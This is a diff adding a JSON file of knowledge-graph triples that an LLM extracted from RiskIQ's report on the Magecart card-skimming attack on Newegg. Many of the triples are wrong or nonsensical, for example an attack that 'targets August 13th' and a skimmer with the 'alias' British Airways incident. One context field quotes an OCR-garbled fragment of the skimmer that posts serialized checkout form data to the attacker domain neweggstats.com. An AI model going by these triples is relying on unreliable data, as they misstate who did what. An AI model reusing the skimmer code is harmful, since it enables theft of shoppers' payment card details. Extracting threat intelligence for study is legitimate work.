@@ -1,0 +1,501 @@
+{
+  "metrics": {
+    "file_name": "AnotherVictimOfTheMagecartAssaultEmerges.pdf",
+    "model_used": "gemma2:9b",
+    "doc_sha256_id": "1f2cadf00d917031",
+    "num_pages": 4,
+    "num_sentences_total": 42,
+    "num_sentences_used": 31,
+    "num_raw_triples": 31,
+    "num_valid_triples": 20,
+    "num_suspicious_triples": 11,
+    "avg_triples_per_sentence": 1.0,
+    "rejection_stats": {
+      "bad_structure": 0,
+      "invalid_class_or_predicate": 11
+    },
+    "runtime_seconds": 36.18191337585449
+  },
+  "data": [
+    {
+      "context": " Another Victim of the Magecart Assault Emerges: Newegg MalBot Sep 2018 RiskIQ conducted the research for this report in collaboration with Volexity, which will release a separate report of its own .",
+      "triple": [
+        {
+          "subject": {
+            "name": "Magecart",
+            "type": "AttackPattern"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Another Victim",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "Another Victim of the Magecart Assault Emerges"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "While the dust is settling on the British Airways compromise, the Magecart actor behind it has not stopped their work, hitting yet another large merchant: Newegg.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Magecart",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Newegg",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "hitting yet another large merchant: Newegg."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Last week we published details on the British Airways compromise immediately after the company made its first advisory public linking the breach of customer credit card information to Magecart.",
+      "triple": [
+        {
+          "subject": {
+            "name": "British Airways",
+            "type": "Organization"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "breach of customer credit card information",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "linking the breach of customer credit card information to Magecart"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We were able to disclose these details based on our years of tracking the activities and infrastructure of the umbrella of Magecart groups performing digital credit card skimming campaigns.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Magecart",
+            "type": "Organization"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "digital credit card skimming campaigns",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "performing digital credit card skimming campaigns"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The British Airways attack was highly targeted and done via a tactic weÕd seen evolving through the years.",
+      "triple": [
+        {
+          "subject": {
+            "name": "British Airways attack",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Tactic",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "highly targeted and done via a tactic"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The report on the British Airways attack came shortly after our discovery that Magecart was also behind the breach of Ticketmaster .",
+      "triple": [
+        {
+          "subject": {
+            "name": "report",
+            "type": "Report"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "British Airways attack",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "The report on the British Airways attack"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The breach of Newegg shows the true extent of Magecart operatorsÕ reach.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Newegg",
+            "type": "Organization"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "breach",
+            "type": "Vulnerability"
+          },
+          "evidence": {
+            "quote": "The breach of Newegg"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "These attacks are not confined to certain geolocations or specific industriesÑany organization that processes payments online is a target.",
+      "triple": [
+        {
+          "subject": {
+            "name": "organization",
+            "type": "Organization"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "payments",
+            "type": "ResourceExploitation"
+          },
+          "evidence": {
+            "quote": "any organization that processes payments online is a target"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The elements of the British Airways attacks were all present in the attack on Newegg: they integrated with the victimÕs payment system and blended with the infrastructure, staying there as long as possible.",
+      "triple": [
+        {
+          "subject": {
+            "name": "elements",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "victimÕs payment system",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "they integrated with the victimÕs payment system"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Another Well-Disguised Attack On August 13th",
+      "triple": [
+        {
+          "subject": {
+            "name": "Attack",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "August 13th",
+            "type": "Time"
+          },
+          "evidence": {
+            "quote": "Another Well-Disguised Attack On August 13th"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Similar to the British Airways attack, these actors acquired a certificate issued for the domain by Comodo to lend an air of legitimacy to their page:",
+      "triple": [
+        {
+          "subject": {
+            "name": "actors",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "certificate",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "these actors acquired a certificate issued for the domain by Comodo to lend an air of legitimacy to their page:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 1,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Around August 14th, the attackers placed the skimmer code on Newegg, managing to integrate it into the checkout process and achieve their goal of disguising it well.",
+      "triple": [
+        {
+          "subject": {
+            "name": "attackers",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Newegg",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "the attackers placed the skimmer code on Newegg"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The URL for the page that would return the skimmer was:",
+      "triple": [
+        {
+          "subject": {
+            "name": "URL",
+            "type": "URL"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "skimmer",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "The URL for the page that would return the skimmer was:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 2,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " https://secure.newegg.com/GlobalShopping/CheckoutStep2.aspx Integrating with this process hid the skimmer and might help explain how it was on the Newegg website for more than a month.",
+      "triple": [
+        {
+          "subject": {
+            "name": "skimmer",
+            "type": "Malware"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "Integrating with this process hid the skimmer and might help explain how it was on the Newegg website for more than a month.",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "Integrating with this process hid the skimmer"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The skimmer code is recognizable from the British Airways incident, with the same basecode.",
+      "triple": [
+        {
+          "subject": {
+            "name": "skimmer code",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "British Airways incident",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "recognizable from the British Airways incident"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "stringify(dati serializeArray( )); 5 setTimeout ( function( ) 6 jQuery ajax( { type: POST\" 8 async: true 9 url: https:/ /neweggstats.com/GlobalData/' data: pdati, dataType: application/json 250) ; 14 H) ; 15 }; Fig-2 15 lines of script, smaller than the British Airways attack The first time the skimmer became active was around August 14th, and we confirmed the skimmer was removed on September 18th, which means the attackers had a full month of skimming Newegg customers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "British Airways attack",
+            "type": "AttackPattern"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "customers",
+            "type": "Person"
+          },
+          "evidence": {
+            "quote": "smaller than the British Airways attack"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Alexa shows that Newegg has the 161st most popular site in the U.S .",
+      "triple": [
+        {
+          "subject": {
+            "name": "Newegg",
+            "type": "Organization"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "the 161st most popular site",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": " has the 161st most popular site"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Meanwhile, weÕre seeing attackers evolve and improve over time, setting their sites on breaches of large brands.",
+      "triple": [
+        {
+          "subject": {
+            "name": "attackers",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "breaches of large brands",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "setting their sites on breaches of large brands"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "While some Magecart groups still target smaller shops, the subgroup responsible for the attacks against Newegg and British Airways is particularly audacious, performing cunning, highly targeted attacks with skimmers that seamlessly integrate into their targetsÕ websites.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Magecart groups",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "smaller shops",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "While some Magecart groups still target smaller shops"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 3,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Article Link: https://www.riskiq.com/blog/labs/magecart-newegg/ New & Unread Topics Want to read more?",
+      "triple": [
+        {
+          "subject": {
+            "name": "Article Link",
+            "type": "URL"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "New & Unread Topics",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "Article Link: https://www.riskiq.com/blog/labs/magecart-newegg/ New & Unread Topics Want to read more?"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 4,
+        "id": "002",
+        "source": "TEXT"
+      }
+    }
+  ]
+}
